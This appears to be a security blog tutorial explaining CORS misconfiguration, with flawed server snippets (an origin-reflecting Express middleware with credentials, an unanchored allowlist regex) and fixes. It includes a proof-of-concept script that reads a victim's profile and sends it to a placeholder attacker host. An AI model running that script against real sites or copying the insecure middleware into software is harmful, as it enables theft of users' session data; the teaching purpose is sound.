CORS Misconfiguration: The Bug That's Basically the Internet Saying "Sure, Come On In"

Dhanusha K · Sept 19, 2026 · 10 min read

Let me set a scene. You're testing an app, you open Burp, and you notice something in the response headers that makes you sit up a little straighter:

Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true

If you know what you're looking at, this is the security equivalent of a bank teller saying "sure, no ID needed, just tell me whose account you want money from." If you don't know what you're looking at yet - stick around, because by the end of this you will, and you'll never un-see it in a Burp response again.

First, What Is CORS Even For?

Before we talk about how it breaks, let's talk about why it exists - because CORS isn't the villain here. It's a well-intentioned bouncer.

By default, browsers enforce something called the Same-Origin Policy (SOP): JavaScript running on siteA.com can't just reach over and read data from siteB.com on a user's behalf. This is good! Without it, any website you visit could silently make authenticated requests to your bank, your email, your everything, using cookies your browser is already carrying around.

But sometimes, legitimate cross-origin requests should be allowed - your frontend on app.example.com needs to talk to your API on api.example.com, for instance. That's what CORS (Cross-Origin Resource Sharing) is for: it's the mechanism that lets a server explicitly say "hey browser, it's fine, let this specific origin through."

The keyword there is specific. CORS misconfiguration happens when "specific" quietly turns into "basically anyone."

The Moment It All Goes Wrong

Here's the thing about CORS bugs - they don't look like bugs. They look like someone solved a problem. Picture a dev, mid-sprint, fighting a wall of red CORS errors in the browser console because the frontend and API are on different domains. It's 6 PM, the errors won't stop, and somewhere on Stack Overflow there's an answer with 4,000 upvotes that "just works":

// The "fix" that started it all
          app.use((req, res, next) => {
            res.header("Access-Control-Allow-Origin", req.headers.origin); // reflects ANY origin back
            res.header("Access-Control-Allow-Credentials", "true");
            next();
          });

The console errors vanish. The feature ships. And now the server will happily reflect literally any origin that asks, including https://totally-not-a-scam.com, and tell the browser it's fine to send cookies along with the request. This is the bug in its most common wild-form, and it's the one you'll find more often than you'd expect once you start actively poking at Origin headers.

The Anatomy of the Bug (aka What You're Actually Looking For)

There are a few flavors, and part of the fun of hunting CORS bugs is that each one has a slightly different "gotcha":

1. The Reflector - server echoes back whatever Origin header you send, no validation at all.

Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com

Send any origin, get that same origin whitelisted right back at you. This is the classic Stack-Overflow-copy-paste bug.

2. The Wildcard-Plus-Credentials Combo - technically browsers block this one (Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true is disallowed by spec), but you'll still see apps trying it, and it's worth knowing as a "this dev didn't fully understand CORS" red flag when you see it attempted elsewhere in the config.

3. The Regex Gone Wrong - someone tried to do this properly with an allowlist regex, and got the pattern wrong:

// Meant to match only subdomains of example.com
if (/example\.com$/.test(origin)) { allow(); }

Looks safe at a glance. Except evil-example.com also ends in example.com and passes right through. Or worse, unescaped dots mean exampleXcom or similar variants slip past too. This is the one that separates a rushed test from a thorough one - always check the regex, don't just skim the intent.

The Null Origin Trap - some configs allow Origin: null to get through (often to support sandboxed iframes or local file testing during dev, then forgotten). An attacker can trivially force a null origin using a sandboxed iframe, so if you see null in the allowlist, that's a free pass sitting right there.

Proving It's Actually Exploitable

Finding the misconfigured header is step one. The part that makes a report land with real impact is showing what an attacker actually gets. A quick PoC does the job:

<script>
fetch("https://victim-api.com/api/user/profile", {
          credentials: "include"
})
.then(res => res.json())
.then(data => {
          fetch("https://attacker-server.com/log?data=" + JSON.stringify(data));
});
</script>

Host that on your test domain, set your test domain as the Origin, and if the response comes back with sensitive account data instead of a CORS rejection - you've got your proof. The victim's browser did all the work, using their real, logged-in session, without them clicking anything except a malicious link.

Why This One Deserves More Than a "Medium" Without Thinking

Here's where a lot of newer testers underrate this bug: CORS misconfig on its own, with no credentialed endpoint behind it, is often low-to-informational. But the moment Access-Control-Allow-Credentials: true is paired with a reflected origin and there's an endpoint returning sensitive data (profile info, tokens, account details, admin functions) - that combination is a full session hijacking / account takeover primitive, no XSS or CSRF token bypass required. The severity swings hard based on what's actually reachable, so don't rate the header in isolation - chase it to an endpoint and see what falls out.

The Fix (For When You Write It Up)

  • Never reflect Origin blindly. Validate against an explicit allowlist of trusted origins.
  • Never combine * with credentials - the spec blocks it, but audit for it anyway as a sign of broader misunderstanding.
  • Tighten regex allowlists - anchor them properly (^https://([a-z0-9-]+\.)?example\.com$), don't just check "ends with."
  • Drop null from any allowlist, full stop.

The Takeaway

CORS misconfiguration is what happens when a security control gets treated as an annoying error message to silence rather than a boundary to respect. It rarely looks dramatic in a diff - usually it's one line, one reflected header, one dev just trying to make the console stop yelling at them. But that one line is often the difference between "our API only talks to our frontend" and "our API talks to whoever asks nicely."

Next time you see a CORS error in a console during testing, don't just move past it - that error is the control working. It's the absence of that error, on an origin that has no business being there, that's the real find.
